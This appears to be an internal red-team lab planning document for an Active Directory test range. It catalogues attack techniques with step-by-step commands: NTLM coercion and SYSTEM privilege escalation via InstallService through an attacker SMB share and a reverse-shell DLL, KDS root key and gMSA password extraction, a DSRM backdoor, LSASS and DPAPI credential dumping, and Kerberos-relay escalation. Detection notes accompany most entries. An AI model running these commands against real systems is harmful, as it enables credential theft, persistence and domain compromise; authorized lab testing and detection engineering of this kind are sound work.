**Author note:** Author self-describes the technique as "not reliable for real red team ops because of its limitation" but the research is published for educational purposes.

**Technique summary:**
1. Attacker: Stand up SMB server (impacket for hash capture, Samba for LPE DLL)
2. Attacker: Stage `AppxManifest.xml` + dummy files at `\\attacker\share\`
3. Victim user: `Add-AppxPackage -Register \\attacker\share\AppxManifest.xml` (creates package with `InstalledLocation` = UNC path)
4. Victim user: `CreateInstallServiceWork` with `FulfillmentPluginId = <that PFN>`
5. SYSTEM `InstallService.exe`: `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)` → outbound SMB → machine account NTLM auth to attacker
6. Optional LPE: serve real DLL via Samba → DllMain runs as SYSTEM in `svchost.exe`

**Exploit vector (technical):**
- COM Class: `Windows.Internal.InstallService.Control.InstallServiceControl`
- IID: `e4893a99-9270-42b9-9a62-683d6ceed250`
- vtable slot 8: `CreateInstallServiceWork(cv, caller, _, _, propertiesJson, optionsJson, out items)`
- JSON field `FulfillmentPluginId` controls plugin resolution
- Branch 5 in `PluginHelpers::ActivatePlugin`: treats unknown ID as Package Family Name → `FindPackagesForUser` → `InstalledLocation.Path` → `LoadLibraryW(path + "\InstallServicePlugin.dll")`

**Pre-condition (gating factor):**
- **Developer Mode must be enabled** on target: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock\AllowDevelopmentWithoutDevLicense = 1`
- Loose-file registration (`Add-AppxPackage -Register`) is the only way to get `InstalledLocation = UNC`
- This is gated by AppX deployment stack (admin-controlled)

**CADRE impact if Developer Mode is enabled:**
- **Phase 5 (Lateral Movement):** New working coercion primitive (alongside WT017 PrinterBug, where WT018-020 are non-functional)
- **Phase 3.5 (Credential Access):** New EoP primitive (non-admin → SYSTEM via InstallService)
- **Phase 6 (Combined with NTLM Relay to ADCS ESC8):** Standard user → dc01$ auth → ESC8 → DA on cert

### 81. UnCanny Coerce — NTLM Coercion via InstallService (Phase 5 Lateral Movement) ⏳

**Pre-conditions:** Standard user on Win 10/11 OR Server 2022/2025 + **Developer Mode enabled** + `InstallService.exe` running (default) + `AppXSvc` running (default)
**Outcome:** Outbound SMB to attacker → `dc01$` (or any target) machine account NTLM
**Auth captured:** `NTLMv1` or `NTLMv2` of the target machine account (the calling user, not the target — machine's auth is the result of LoadLibraryW)

**Testing plan (if Developer Mode confirmed):**
1. From Kali: stand up impacket-smbserver with patched `FileSystemName` field (XTFS → NTFS, per author's setup.sh)
2. Stage `poc/AppxManifest.xml` + dummy files
3. From mbr01 as `intern_blue` (or any standard user with interactive session): `Add-AppxPackage -Register \\192.168.77.60\coerce\AppxManifest.xml`
4. Run `Invoke-InstallServiceCoerce.ps1` with attacker host = Kali
5. Confirm `dc01$` NTLM hash captured on impacket-smbserver
6. Crack with hashcat mode 13100 (RC4) or 19700 (AES256)
7. Use cracked hash to perform DCSync or relay to ADCS ESC8

**MITRE ATT&CK:** T1187 Forced Authentication, T1557 Adversary-in-the-Middle (NTLMv2 relay)
**Status:** 🔬 Deferred — gated on Developer Mode check + admin decision to enable in playbook. Per user 2026-06-19: "document only, defer test" until after campaign verification. Track G in Parallel Tracks.

### 82. UnCanny LPE — Non-Admin → SYSTEM via InstallService (Phase 3.5 Credential Access) ⏳

**Pre-conditions:** Same as #81 + Samba server (impacket cannot serve a loadable image)
**Outcome:** `DllMain` of attacker-controlled `InstallServicePlugin.dll` runs as `NT AUTHORITY\SYSTEM` inside `svchost.exe` (the `InstallService` host)
**Key insight from author:** `impacket` returns `ERROR_INVALID_HANDLE` when `LoadLibraryW` reads from its share, so the LPE path requires a real SMB server. Samba reports NTFS by default so loose registration still works.

**Testing plan (if #81 succeeds and Samba is available):**
1. Compile `lpe/lpe.c` and `lpe/plugin.c` as a DLL with `DllMain` that spawns reverse shell
2. Stage on Samba share (not impacket)
3. Same trigger as #81 but with DLL present
4. Confirm `NT AUTHORITY\SYSTEM` shell in `svchost.exe` context
5. This is **direct SYSTEM** — no GodPotato/PrintSpoofer needed

**MITRE ATT&CK:** T1068 Exploitation for Privilege Escalation, T1574.001 Hijack Execution Flow (DLL Side-Loading)
**Status:** 🔬 Deferred — gated on Developer Mode check + Samba setup on Kali. Per user 2026-06-19: "document only, defer test" until after campaign verification. Track G in Parallel Tracks.

### 83. IPv4-Mapped IPv6 Phishing URL Parser Bypass (SANS ISC 33090) ⏳

**Source:** https://isc.sans.edu/diary/rss/33090 (Xavier Mertens, 2026-06-19)
**Target observed:** Major Belgian bank (Belfius) — phishing email with `hxxp://[::ffff:5511:74be]/kWC5PHA1` → resolves to `85.17.116.190` → redirects to `hxxps://3439-aanmelden.verificatie.qzz.io/mon-belfius`

**Technique:** RFC 4291 IPv4-mapped IPv6 notation `::ffff:0.0.0.0/96`. Bypasses:
- Regex-based domain extractors (no FQDN)
- Regex-based IP extractors (no dotted-quad)
- DNS-based URL blocklists (no DNS query needed)
- Reputation services (fresh IP, not yet blacklisted)

**CADRE relevance:** Not a direct campaign attack (we don't do phishing simulation), but a **detection engineering** lesson. Add to plan1.7 §14 as detection rule for `[::ffff:X:X:X:X]` in HTTP URIs.

**Status:** 🔬 Deferred — Detection rules already in plan1.7 §14 (Suricata SID 1000096-1000097). No live testing needed. Per user 2026-06-19: "document only, defer test" until after campaign verification.

---

## KDS Root Key Attacks — Grafnetter TROOPERS26 (2026-06-20)

**Source:** https://troopers.de/troopers26/talks/fpkkra/ (Michael Grafnetter, SpecterOps)
**Tool:** DSIternals PowerShell Module v7.0 (May 2026) — https://github.com/MichaelGrafnetter/DSInternals
**Full analysis:** `docs/internal/references/kds-root-key-attacks.md` (300+ lines, all 6 attacks with DSIternals commands, pre-conditions, and detection engineering)
**Author:** Michael Grafnetter — inventor of Shadow Credentials, creator of DSIternals, Microsoft MVP

**Mechanism (shared by all 6 attacks):** KDS Root Key (stored in AD as `msKds-ProvRootKey`) + DPAPI-NG SID Protectors. Once you have DA (Phase 6/7), extract the KDS root key via DCSync/LDAP/ntds.dit → derive ANY SID group key offline → decrypt ANY DPAPI-NG protected secret. **Zero network signature on the attack** — only detection is on the KDS root key dump side.

**Pre-conditions for ALL attacks in this section:**
- DA on the domain (Phase 6/7 of our campaign) — already in CAMPAIGNS.md
- DSIternals installed on attacker host (`Install-Module DSInternals -Force`)
- Target secret exists in the domain (gMSA, BitLocker, DNSSEC, etc.)

### 84. KDS Root Key Extraction (Post-DA Prerequisite) ⏳

**Source:** DSIternals v7.0 — `Get-ADReplKdsRootKey`, `Get-ADSIKdsRootKey`, `Get-ADDBKdsRootKey`
**MITRE:** T1552.004 (Unsecured Credentials: Private Keys)
**Outcome:** KDS Root Key — unlocks all gMSA passwords, DPAPI-NG SID keys, DNSSEC keys, PFX secrets. **Prerequisite for items #85-89 below.**

**Test plan (testable today on CADRE):**
```powershell
# Post-DCSync: extract via replication
Get-ADReplKdsRootKey -Domain child.cadre.local | Export-Clixml KdsRootKeys.xml

# Or via LDAP direct
Get-ADSIKdsRootKey | Export-Clixml KdsRootKeys.xml

# Or from offline backup
Get-ADDBKdsRootKey -DatabasePath .\ntds.dit | Export-Clixml KdsRootKeys.xml
```

**Detection (plan1.7 §15 candidate):**
- WinSec 4662 on `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Service,CN=Configuration,...`
- DRSGetNCChanges opnum 3 against the Configuration partition
- LDAP read by non-DC computer

**Status:** ⏳ Pending — testable today, no infra changes needed. Awaiting Phase 6/7 completion.

### 85. Golden gMSA Attack (Offline Password Computation) ⏳

**Source:** DSIternals v7.0 — `Get-ADDBServiceAccount`
**MITRE:** T1552.004, T1003.006 (OS Credential Dumping: DCSync)
**Outcome:** Current AND future passwords of every gMSA in the domain, computed offline. Survives gMSA rotation (predicts next 30 days).

**Test plan (testable today):**
```powershell
$rootKey = Import-Clixml .\KdsRootKeys.xml
# Extract ALL gMSA passwords from ntds.dit
Get-ADDBServiceAccount -DatabasePath .\ntds.dit | Format-List
# Returns: SamAccountName, NTHash, AES256 Kerberos Key
# Predict future password 30 days ahead
Get-ADDBServiceAccount -DatabasePath .\ntds.dit -EffectiveTime (Get-Date).AddDays(30)
```

**Maps to:** Branch A Path G (gMSA Extraction WT024) — enhances it with offline Golden gMSA variant
**CADRE-specific test:** After Phase 2, generate `svc_mssql$` password → PTH to mbr01 (matches our existing pivot)

**Status:** ⏳ Pending — testable today. Need KDS root key (#84) first.

### 86. DSRM Password Extract & Set (DC Persistence) ⏳

**Source:** DSIternals v7.0 — `Set-LsaPolicyInformation`, `Get-ADDBAccount`
**MITRE:** T1003.002, T1556.005
**Outcome:** Backdoor access to DC that survives AD credential rotation. Pivot for offline ntds.dit dump.

**Test plan (testable today):**
```powershell
# On dc01 (post-Phase 3 SYSTEM):
Set-LsaPolicyInformation -DomainController dc01.child.cadre.local `
  -NewDrmPassword (ConvertTo-SecureString "Pwn3dByDA!" -AsPlainText -Force)
# Reboot dc01 into DSRM (F8 on VMware console)
# Log in as .\Administrator / Pwn3dByDA! — no AD creds needed
```

**Maps to:** NEW 3.5P in Branch 3.5 (DC persistence)
**Detection:** WinSec 4662 on `CN=Local Policy,CN=DomainController,...`, Event 100 (DSRM logon), 4624 type 2 source=DSRM

**Status:** ⏳ Pending — testable today. Need DC admin (Phase 3).

### 87. LAPS Bulk Extraction (Enhancement) ⏳

**Source:** DSIternals v7.0 — `Get-ADDBAccount -LapsPasswords`
**MITRE:** T1552.004
**Outcome:** All LAPS passwords in bulk from ntds.dit
**Already in CAMPAIGNS.md:** 3.5L (LAPS Extraction) — **enhance with DSIternals bulk export**
**Status:** ⏳ Pending — testable today. Already in 3.5L, just need to enhance with DSIternals commands.

### 88. Golden dMSA Attack (Server 2025) ⏳

**Source:** DSIternals v7.0 — `Get-ADDBServiceAccount` (filter by `msDS-DelegatedManagedServiceAccount`)
**MITRE:** T1552.004
**Outcome:** Current and future passwords of every dMSA in the domain (dMSAs are the Server 2025 successor to gMSAs)
**CADRE gap:** No dMSA configured in our playbooks. Need to add a dMSA setup step.
**Status:** ⏳ Pending — needs dMSA infra addition to playbook.

### 89. DPAPI-NG SID Protector Decryption (BitLocker / PFX / DNSSEC / ASP.NET) ⏳

**Source:** DSIternals v7.0 — `Save-DpapiNgSidKey`, `Unprotect-DpapiNgData`, `Unprotect-DpapiNgPfxCertificate`
**MITRE:** T1003 (varies by target)
**Outcome:** Decrypt ANY DPAPI-NG protected secret, given the target's SID and the KDS root key

**Sub-techniques (all require #84 first):**
- **BitLocker SID Protector:** Unlock BitLocker volumes via `manage-bde -unlock -sid` (⏳ deferred — no BitLocker infra in CADRE)
- **PFX group-protected:** Decrypt SID-protected PKCS#12 PFX files for offline RSA key extraction (⏳ deferred — no PFX infra in CADRE)
- **DNSSEC KSK/ZSK:** Extract private DNSSEC signing keys (⏳ deferred — no DNSSEC infra in CADRE)
- **ASP.NET Core conn strings:** Decrypt encrypted `appsettings.json` connection strings (❌ skip — no .NET infra in CADRE)

**Status:** ⏳ Deferred — all sub-techniques require infra additions.

### Detection Engineering (plan1.7 §15 candidates)

| Attack | Detection signal |
|---|---|
| #84 KDS Root Key extraction | WinSec 4662 on KDS root key container |
| #85 Golden gMSA | No network signal; gMSA auth from unexpected host → 4624 type 3 |
| #86 DSRM persistence | LSA Policy modify (4662), Event 100 (DSRM logon) |
| #87 LAPS bulk | 4662 on ms-Mcs-AdmPwd attribute read |
| #89 DPAPI-NG cache writes | File create in `%LOCALAPPDATA%\Microsoft\Crypto\KdsKey\` outside OS setup |

### Items NOT to add to CAMPAIGNS.md

Per user instruction 2026-06-20: **"save to analysis and add as separate KDS root key section in campaign suggestions only"** — these items (#84-89) live in Campaign_suggestions.md as research/study material. They will be moved to CAMPAIGNS.md when we reach the relevant phase (post-Phase 6/7) and decide to test.

---

## AD Attack Tool Landscape Updates (2026-06-24)

**Source:** `docs/internal/references/ad-tools-landscape-2026-06-24.md` (~30 KB, 10 sections, 60+ tool inventory).

### Background

Comprehensive research on modern AD attack tools. Foundational update that:
- **Confirms NetExec** (formerly CrackMapExec) v1.5.1 (Feb 23 2026) as the canonical post-CME tool — 10 protocols (SMB/LDAP/MSSQL/WinRM/WMI/SSH/RDP/FTP/NFS/VNC), new `nxc` binary, backward-compatible syntax.
- **Definitively identifies Bark** as **BARK = BloodHound Attack Research Kit** (https://github.com/BloodHoundAD/BARK, Andy Robbins / SpecterOps). PowerShell, **Azure/Entra ID ONLY** — no on-prem AD functionality. Companion to bloodyAD (same author: CravateRouge). Maps to Plan 11 only, NOT main spine.
- Identifies **Tier 1 must-add tools**: NetExec, bloodyAD v2.5.4, Certipy v5.1.0, DonPAPI v2.0+, lsassy v3.1.16. (bloodyAD + Certipy already in CAMPAIGNS.md; NetExec, DonPAPI, lsassy to be added.)
- Identifies **Tier 2 add tools**: KrbRelay + KrbRelayUp (LPE via Kerberos relay), BARK (Plan 11 only).
- Identifies **already-current tools** (no upgrade needed): Coercer v2.4.3, Whisker, PKINITtools, Impacket, Mimikatz, Rubeus.
- Identifies **deprecated/absorbed tools** (do NOT use): `crackmapexec` (replaced by `nxc`), `Certify.exe` (replaced by Certipy), `aclpwn.py` (404 — absorbed into bloodyAD + Certipy + Impacket), `pyWhisker` (no separate repo — absorbed into Certipy `shadow auto`).

### 90. NetExec (nxc) — Modern CrackMapExec Replacement (Phases 0-5) 🆕

**Source:** https://github.com/Pennyw0rth/NetExec (v1.5.1, Feb 23 2026). https://www.netexec.wiki/
**Tool:** `nxc` binary (replaces `crackmapexec`/`cme`). BSD-2-Clause.
**MITRE:** Cross-cutting (all phases)
**Status:** 🆕 Add — global upgrade for `crackmapexec` references (none currently in CAMPAIGNS.md since we use bloodyAD + impacket directly). Add for new commands.

**Why CADRE needs it:**
- **Unified post-exploitation framework** — 10 protocols (SMB/LDAP/MSSQL/WinRM/WMI/SSH/RDP/FTP/NFS/VNC) in one tool.
- **16+ dump modules** — SAM, LSA, NTDS.dit, LSASS, DPAPI, LAPS, SCCM, **Token Broker Cache** (Azure/M365 tokens!), WiFi, KeePass, Veeam, WinSCP, PuTTY, VNC, mRemoteNG.
- **Built-in vulnerability scans** — `nxc smb ... -M zerologon -M petitpotam -M smbghost -M ms17-010 -M nopac`.
- **RBCD + Delegation module** — `-M rbcd` for Resource-Based Constrained Delegation.
- **Active maintenance** — v1.5.1 (Feb 23 2026) patched a spider_plus arbitrary file write CVE. CME last release Sep 2023.
- **Native Windows binary** — no Python install needed on Windows targets.

**Why important for CADRE specifically:**
- Our Kali (provisioning VM) is Linux, so we use the `pipx` install. The `nxc` Python binary works on all platforms.
- NetExec's `nxc smb ... -M laps` module directly returns the LAPS password for any host (faster than `Get-ADComputer` + `ms-Mcs-AdmPwd` attribute query).
- The `-M nopac` module checks for CVE-2021-42287 (noPac) — relevant for Phase 6/7 escalation paths.
- The `-M zerologon` and `-M petitpotam` modules are quick smoke tests for vulnerability exposure.
- The `-M token-broker` module is the **bridge to Plan 11** — extracts Azure/M365 access tokens from Windows hosts for cloud lateral movement (read in conjunction with `azure_attacks` plan).

**Where to use in CADRE:**

| Phase | nxc command example | Replaces |
|-------|---------------------|----------|
| 0 | `nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_Blu3!' --shares` | nmap + smbclient |
| 0 | `nxc ldap 192.168.77.10 -u intern_blue -p '1nt3rn_Blu3!' -q '(objectClass=user)'` | ldapsearch |
| 0 | `nxc smb 192.168.77.0/24 -u guest -p '' --rid-brute 10000` | rid-cycle |
| 1 | `nxc smb 192.168.77.0/24 -u users.txt -p Summer2026! --no-bruteforce` | kerbrute |
| 2 | `nxc smb 192.168.77.0/24 -u user -p pass -M laps` | manual LAPS query |
| 3 | `nxc mssql 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -q 'SELECT SYSTEM_USER'` | mssqlclient.py |
| 3.5 | `nxc smb 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!' -M lsassy` | manual LSASS dump |
| 3.5 | `nxc smb 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!' -M donpapi` | manual DPAPI |
| 5 | `nxc smb 192.168.77.22 -u svc_mssql -p 's3rv1c3_MSSQL!' -M nopac -M zerologon -M petitpotam` | manual vuln checks |
| 5 | `nxc smb 192.168.77.22 -u admin -p 'P@ss!' -M rbcd -o TARGET=dc01$ ACTION=write` | bloodyAD RBCD |

**Install:** `pipx install git+https://github.com/Pennyw0rth/NetExec` (per official README).

**Testing plan:** ✅ Recommended for Phase 0 recon enhancement. Add to `phase0/` recon scripts + `tools/` automation. Try `nxc smb 192.168.77.0/24 -u intern_blue -p '1nt3rn_Blu3!'` as Phase 0 Step 0.5 (post-port-scan, pre-kerbrute).

**Detection:** NetExec's SMB auth attempts produce the same WinSec 4624/4625/4776 events as any other tool. **Telltale signature**: `nxc` defaults to multiple parallel auth attempts (vs CME's slower serial) — high-rate 4625 events with a single source IP are typical NetExec scans. Add to `plan1.7` detection rules.

**Cross-references:**
- Replaces `crackmapexec` (CME) — Sep 2023 abandoned
- Replaces `nmap` for SMB/LDAP/MSSQL auth checks
- `nxc mssql` partially overlaps with `mssqlclient.py` (impacket) — use both
- `nxc ssh` partially overlaps with `hydra` — use nxc for quick auth, hydra for complex brute

### 91. bloodyAD v2.5.4 — Linux PowerView Replacement (Phases 2, 3.5, 5) ✅ ADOPTED

**Source:** https://github.com/CravateRouge/bloodyAD (v2.5.4, Jan 31 2026)
**Tool:** `bloodyAD` Python CLI. Built on `msldap` (skelsec) + `msdsm` (skelsec).
**MITRE:** T1078.002, T1098, T1136, T1003
**Status:** ✅ Already adopted into CAMPAIGNS.md (Phase 2 ACE#18, Branch A, Branch 3.5). Update reference to v2.5.4.

**Why important for CADRE:** Already integrated. Update version note. v2.5.4 (Jan 2026) added:
- **dMSA abuse** — `bloodyAD add delegated-msa ...` for the new Server 2025 delegated Managed Service Account type (relevant for #88 Golden dMSA)
- **ACL write helpers** — `bloodyAD set dacledit ...` for direct ACE write
- **RBCD automation** — `bloodyAD add rbcd ...` is now a single command (no Python script wrapper needed)

**Test plan (v2.5.4 features):** ✅ Already tested Phase 2 ACE#18 (intern_blue → analyst_t2 ForceChangePassword). Test new v2.5.4 dMSA features during Phase 3.5 when applicable.

**Cross-references:** Companion to BARK (Plan 11) — same author (CravateRouge). See item #96 BARK.

### 92. Certipy v5.1.0 — Modern ADCS Framework (Branch B) ✅ ADOPTED

**Source:** https://github.com/ly4k/Certipy (v5.1.0, Jun 23 2026)
**Tool:** `certipy-ad` Python CLI. Replaces `Certify.exe` (archived 2021).
**MITRE:** T1558.004 (Forge Kerberos Tickets: AS-REP Roasting with cert), T1649 (Steal or Forge Authentication Certificates)
**Status:** ✅ Already adopted into CAMPAIGNS.md (Branch B). Update reference to v5.1.0.

**Why important for CADRE:** Already integrated. v5.1.0 (Jun 2026) added:
- **ESC17** (newly documented) — Certipy CA template with `msPKI-Private-Key-Flag` set to 0x1
- **Golden certificate forging** — `certipy forge -ca-pfx ca.pfx -subject 'CN=Administrator'`
- **Shadow creds automation** — `certipy shadow auto -u user -p pass -target dc01` (one-shot)
- **ADCS NTLM relay** — `certipy relay -ca cadre-CA -template Machine` (replaces ntlmrelayx + Certify combo)
- **Improved ESC15** detection (Schannel authentication EKU bypass)

**Test plan:** ✅ Already adopted Branch B. Test new ESC17 detection during next ADCS retest.

**Cross-references:** Companion to **Locksmith** (item #93) — Locksmith is the defensive view of the same misconfigurations.

### 93. DonPAPI v2.0+ — Remote DPAPI Credential Harvesting (Phase 3.5) 🆕

**Source:** https://github.com/login-securite/DonPAPI
**Tool:** `donpapi` Python CLI (v2.0+ with GUI frontend). Replaces manual SharpDPAPI remote collection.
**MITRE:** T1555.004 (Credentials from Password Stores: Windows Credential Manager), T1003
**Status:** 🆕 Add — Phase 3.5.

**Why CADRE needs it:**
- **12+ remote collectors** in single command — Chromium, Firefox, CredMan, MobaXterm, mRemoteNG, RDCMan, WiFi, VNC, SCCM, Vaults, WinSCP, PuTTY.
- **Auto-dumps Domain Backup Key** — `--fetch-pvk` then decrypts all master keys offline.
- **Cloud credential collection** — `--collectors Azure,GitHub,GitLab` for dev workstation creds.
- **PSReadLine history** — PowerShell command history with secrets (Azure CLI tokens, API keys).
- **Online mode** — runs against live targets, not just offline dumps.

**Where to use in CADRE:**

```bash
# Post-DA, from Kali, against mbr01 (where SYSTEM via 3.5F)
donpapi collect -u cadre.local/Administrator -p 'P@ss!' -d cadre.local -t 192.168.77.22
# Auto-fetches Domain Backup Key + decrypts all master keys
# Returns: all DPAPI-protected secrets on the host

# Or via NetExec module
nxc smb 192.168.77.22 -u Administrator -p 'P@ss!' -M donpapi
```

**Test plan (Phase 3.5, after SYSTEM):**
1. Get SYSTEM on mbr01 (Phase 3 chain or 3.5F)
2. `donpapi collect -u Administrator -p 'P@ss!' -t 192.168.77.22`
3. Verify returned secrets include: Chromium browser creds, CredMan entries, WiFi passwords, MobaXterm master key
4. Map to DFIR-Nexus as evidence (`mcp: dfir_nexus.ingest` with `source: donpapi`)

**Detection:** Same as SharpDPAPI (existing) — process creation of `donpapi` is detectable via process command-line. File create events on `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` is the primary signal.

**Cross-references:** Pairs with **lsassy** (item #94) for comprehensive post-DA credential theft. Together cover 80% of remote cred extraction.

### 94. lsassy v3.1.16 — Remote LSASS Dump (15+ Methods) (Phase 3.5) 🆕

**Source:** https://github.com/login-securite/lsassy (v3.1.16, Mar 23 2026)
**Tool:** `lsassy` Python CLI. Also bundled as `nxc smb -M lsassy` module.
**MITRE:** T1003.001 (OS Credential Dumping: LSASS Memory)
**Status:** 🆕 Add — Phase 3.5.

**Why CADRE needs it:**
- **15+ LSASS dump methods** in one tool — `comsvcs.dll` (built-in), `procdump`, `dumpert`, `nanodump`, `mirrordump`, `ppldump`, `silentprocessexit`, `sqldumper`, `WER`, `EDRSandBlast`, and more.
- **Evasive by default** — uses signed Microsoft binaries where possible (comsvcs, sqldumper, WER). nanodump uses direct syscalls to bypass userland hooks.
- **Anti-AV aware** — autodetects EDR, picks dump method that bypasses it.
- **Linux-first** — runs from Kali against Windows targets, no Windows shell needed.
- **Bundle with NetExec** — `nxc smb ... -M lsassy -o METHOD=nanodump` is the cleanest attack path.

**Where to use in CADRE:**

```bash
# From Kali against mbr01 with admin creds
lsassy -d cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168.77.22
# OR with NetExec
nxc smb 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!' -M lsassy
# OR with explicit method
lsassy -m nanodump -d cadre.local -u admin -p 'P@ss!' 192.168.77.22
```

**Test plan (Phase 3.5):**
1. Get admin on mbr01 (Phase 3 SQL chain gives `analyst_t1` with sysadmin; can use this)
2. `lsassy 192.168.77.22 -u analyst_t1 -p 'T13r_An@lyst!'`
3. Verify returned secrets include: NTLM hashes, Kerberos TGTs, CredMan entries, DPAPI master keys
4. Compare output to existing 3.5F LSASS dump (procdump + mimikatz) — lsassy should be more reliable

**Detection:** `lsassy` triggers the same events as any other LSASS dump:
- Sysmon EID 10 (ProcessAccess) to lsass.exe
- Sysmon EID 1 (ProcessCreate) of the dump method binary
- WinSec 4663 (File System Access) on the dump file
- Defensive: lsass.exe access from non-SYSTEM process is the primary signal (WinSec 4663 with `ObjectName: \Device\HarddiskVolume*\lsass.dmp`)

**Cross-references:** Replaces Mimikatz remote LSASS (less reliable). Pairs with DonPAPI (item #93) for full post-DA coverage.

### 95. KrbRelay + KrbRelayUp — LPE via Kerberos Relay (Branch 3.5) 🆕

**Source:** https://github.com/cube0x0/KrbRelay + https://github.com/Dec0ne/KrbRelayUp
**Tool:** `KrbRelay.exe` (C#) + `KrbRelayUp.exe` (C#)
**MITRE:** T1558 (Steal or Forge Kerberos Tickets) + T1068 (Exploitation for Privilege Escalation)
**Status:** 🆕 Add — Branch 3.5 (LPE).

**Why CADRE needs it:**
- **No CVE, by-design bypass** — abuses default LDAP signing behavior in many configurations.
- **Universal LPE** — works on any user with any local privilege if conditions are met.
- **Bypasses `RunAsPPL` (LSASS PPL)** in some configurations via the Kerberos path.
- **KrbRelayUp specifically** chains Kerberos relay → RBCD → S4U2Self → SYSTEM in one executable.
- **Server 2025 status:** COM CLSID for Server 2025 (90f18417-f0f1-484e-9d3c-59dceee5dbd8) is valid, but LDAP signing requirements have tightened. Test carefully.

**Where to use in CADRE:**

```bash
# On Windows (KrbRelayUp — needs local execution):
KrbRelayUp.exe relay -d cadre.local -cn "WIN-ATTACKER$" -cp "P@ss!" -l 1337
# Creates a new computer, sets RBCD on a target, abuses S4U2Self → SYSTEM

# Or on Kali (KrbRelay from Linux):
# Requires impacket + a Windows foothold to run the relay listener
```

**Test plan (Branch 3.5):**
1. Get any standard user foothold on mbr01 (e.g., via WT063 file detonation or Phase 1)
2. Transfer KrbRelayUp.exe to mbr01
3. `KrbRelayUp.exe relay -d cadre.local -cn "EVILBOX$" -cp "P@ss!" -l 1337`
4. Verify new computer object `EVILBOX$` created in `CN=Computers,DC=cadre,DC=local`
5. Verify RBCD write on target computer
6. Verify SYSTEM shell in new process

**Detection:**
- **Event 4742** (Computer Account Created) — `EVILBOX$` creation by low-priv user
- **Event 5137** (Directory Service Object Created) — if EVILBOX$ object shows up
- **Event 4673** (Sensitive Privilege Use) — SeEnableDelegationPrivilege use by non-admin
- **Elastic KQL candidate**: `event.code:4742 AND winlog.event_data.SubjectUserName:<standard_user>`

**Cross-references:** Chains with bloodyAD (item #91) for cleaner Linux-side RBCD setup. Replaces named pipe impersonation (item #39) and token dance (item #41) for non-DC targets.

### 96. BARK (BloodHound Attack Research Kit) — Azure/Entra ID Abuse Validation (Plan 11) ⏳

**Source:** https://github.com/BloodHoundAD/BARK
**Tool:** `BARK.ps1` PowerShell module. Author: Andy Robbins (SpecterOps co-founder, BloodHound creator).
**MITRE:** All Entra ID abuse primitives (Plan 11 only)
**Status:** ⏳ Plan 11 — Azure/Entra ID ONLY. Do NOT add to main spine.

**Why user mentioned "Bark" with "azure only i think":** BARK exists, is exclusively Azure/Entra-focused, and is a primary tool for cloud attack automation. User's memory was correct.

**Why BARK matters for Plan 11 (Cloud/Entra):**
- **80+ Entra/Azure functions** — token management, Entra enumeration, AzureRM enumeration, Intune enumeration, abuse functions, meta-testing functions.
- **Continuous validation** — SpecterOps uses BARK to validate Azure abuse primitives as Microsoft patches ship.
- **Test- functions** — `Test-AzureRMAddSelfToAzureRMRole`, `Test-MGAddSelfToEntraRole` etc. — automated abuse chain testers.
- **Companion to bloodyAD** — BARK is the Azure equivalent of bloodyAD's on-prem AD privesc framework. Same author CravateRouge contributes to both.

**Where to use in CADRE (Plan 11 only):**

```powershell
# In EntraGoat (separate Azure tenant for Plan 11 testing)
Import-Module .\BARK.ps1
Get-AllEntraApps
Get-AllEntraUsers
Get-EntraTierZeroServicePrincipals
Invoke-AllEntraAbuseTests
```

**Test plan (Plan 11, separate from main spine):**
1. Deploy EntraGoat environment (Azure free tenant)
2. Clone BARK to EntraGoat
3. Run `Get-AllEntraApps` + `Invoke-AllEntraAbuseTests`
4. Map outputs to ROADtools + AADInternals
5. Use `New-PowerShellFunctionAppFunction` for Azure Function persistence

**Detection:** Azure AD audit log — `Get-AllEntraApps` triggers a Microsoft Graph token request, but this is from authenticated user context so not anomalous. BARK abuse functions (`New-EntraAppSecret`, `Add-MemberToEntraGroup`, `Reset-EntraUserPassword`) trigger Azure AD audit log entries that defender must correlate.

**Cross-references:** Companion to bloodyAD (item #91) — same author, different domain. Maps to Plan 11 items #69-75 (Dirk-jan's Cloud Kerberos Trust, Actor Tokens, PRT Phishing, Intune ADCS, TAP, Federated Creds, App Admin).

**Why NOT in main CAMPAIGNS.md:** BARK has no on-prem AD functionality. Adding it to Phase 0-8 would be misleading. Plan 11 is the right place.

### Cross-Reference Index update

| # | Item | Source |
|---|------|--------|
| 90 | NetExec (nxc) — CrackMapExec replacement | Pennyw0rth (v1.5.1 Feb 2026) |
| 91 | bloodyAD v2.5.4 — Linux PowerView replacement | CravateRouge (Jan 2026) — already in CADRE |
| 92 | Certipy v5.1.0 — Modern ADCS framework | ly4k (Jun 2026) — already in CADRE |
| 93 | DonPAPI v2.0+ — Remote DPAPI harvesting | login-securite |
| 94 | lsassy v3.1.16 — Remote LSASS dump (15+ methods) | login-securite (Mar 2026) |
| 95 | KrbRelay + KrbRelayUp — LPE via Kerberos relay | cube0x0 / Dec0ne |
| 96 | BARK (BloodHound Attack Research Kit) — Azure/Entra only | BloodHoundAD/SpecterOps — Plan 11 only |

### Items NOT to add to CAMPAIGNS.md (per current scope)

Per "main campaign testing first" workflow (established 2026-06-08): #90-96 added to Campaign_suggestions.md. **#90 (NetExec), #93 (DonPAPI), #94 (lsassy), #95 (KrbRelay)** recommended for direct adoption into CAMPAIGNS.md Phase 0/3.5/Branch 3.5 (per user direction 2026-06-24). #91, #92 already adopted. #96 stays in Plan 11 only (Azure/Entra).

**Recommended CAMPAIGNS.md updates** (post-research):
- Phase 0 recon: add `nxc smb` + `nxc ldap` quick-recon section
- Phase 3.5 (3.5F): add `lsassy` + `nxc -M lsassy` as alternative to mimikatz
- Phase 3.5 (new 3.5O): add `donpapi` + `nxc -M donpapi` for DPAPI remote
- Branch 3.5 (3.5P): add `KrbRelayUp` for LPE via Kerberos relay
- Plan 11: add BARK + ROADtools + AADInternals

---

## Onelogon — Single-Channel NRPC Authentication Bypass (WOOT 2026, 2026-06-24)

**Source:** "Onelogon: An Authentication Bypass for Windows Active Directory via Single-Channel Netlogon" — Alexandru-Vlad Pădurean, WOOT 2026 (Workshop on Offensive Technologies), August 1-3 2026.
